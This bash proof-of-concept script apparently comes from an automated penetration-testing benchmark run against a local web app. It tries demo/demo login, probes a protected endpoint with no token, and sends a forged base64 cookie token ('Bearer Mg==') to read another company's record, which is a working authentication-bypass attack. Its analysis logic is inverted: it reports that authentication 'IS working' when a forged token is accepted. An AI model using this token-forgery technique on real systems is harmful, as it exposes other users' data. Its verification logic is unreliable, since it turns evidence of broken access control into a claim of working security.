#!/bin/bash
# POC: Test to verify whether authentication is completely broken or functional by attempting to obtain and use JWT tokens
# Target: ./repo
# Created: 2025-11-10T14:52:23.680Z
# Session: benchmark-XBEN-021-24-mht8yjkr

TARGET="http://localhost:8080"
RESULTS=""

echo "=========================================="
echo "Authentication System Verification"
echo "=========================================="
echo ""

# Test 1: Try demo credentials
echo "[TEST 1] Attempting login with demo/demo credentials..."
RESPONSE=$(curl -s -X POST "$TARGET/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=demo&password=demo")
echo "Response: $RESPONSE"
echo ""

# Test 2: Check if we got a valid token or error
if echo "$RESPONSE" | grep -q "Incorrect username or password"; then
    echo "[RESULT] Authentication FAILED - demo/demo rejected"
    RESULTS="${RESULTS}demo_failed:true\n"
elif echo "$RESPONSE" | grep -q "token\|Bearer\|jwt"; then
    echo "[RESULT] Authentication SUCCEEDED - token obtained"
    RESULTS="${RESULTS}demo_succeeded:true\n"
else
    echo "[RESULT] Unknown response format"
    echo "Full response: $RESPONSE"
fi
echo ""

# Test 3: Try to access protected endpoint without token
echo "[TEST 2] Testing protected endpoint without authentication..."
PING_RESPONSE=$(curl -s -X GET "$TARGET/company/1" \
  -H "Accept: application/json")
echo "GET /company/1 Response: $PING_RESPONSE"
echo ""

# Test 4: Test with admin token (from existing IDOR finding - base64("2"))
echo "[TEST 3] Testing with forged token (base64 encoded company ID)..."
FORGED_TOKEN="Bearer Mg=="
PROTECTED_RESPONSE=$(curl -s -X GET "$TARGET/company/2" \
  -H "Cookie: user_token=$FORGED_TOKEN" \
  -H "Accept: application/json")
echo "GET /company/2 with forged token Response: $PROTECTED_RESPONSE"
echo ""

# Test 5: Check if token-based access works
if echo "$PROTECTED_RESPONSE" | grep -q "Unauthorized\|401\|401 Unauthorized"; then
    echo "[RESULT] Protected endpoint correctly rejected unauth request"
elif echo "$PROTECTED_RESPONSE" | grep -q "name\|data\|company"; then
    echo "[RESULT] Protected endpoint ACCEPTED request - authentication system IS working!"
    RESULTS="${RESULTS}token_auth_working:true\n"
else
    echo "[RESULT] Protected endpoint response inconclusive"
fi
echo ""

echo "=========================================="
echo "ANALYSIS:"
echo "=========================================="
if echo -e "$RESULTS" | grep -q "demo_succeeded\|token_auth_working"; then
    echo "CONTRADICTION DETECTED:"
    echo "- Proposed finding claims ALL authentication fails"
    echo "- Testing shows authentication IS functional"
    echo "- Either evidence is incomplete OR authentication works in some cases"
    exit 1
else
    echo "Proposed finding appears consistent - authentication may be broken"
    exit 0
fi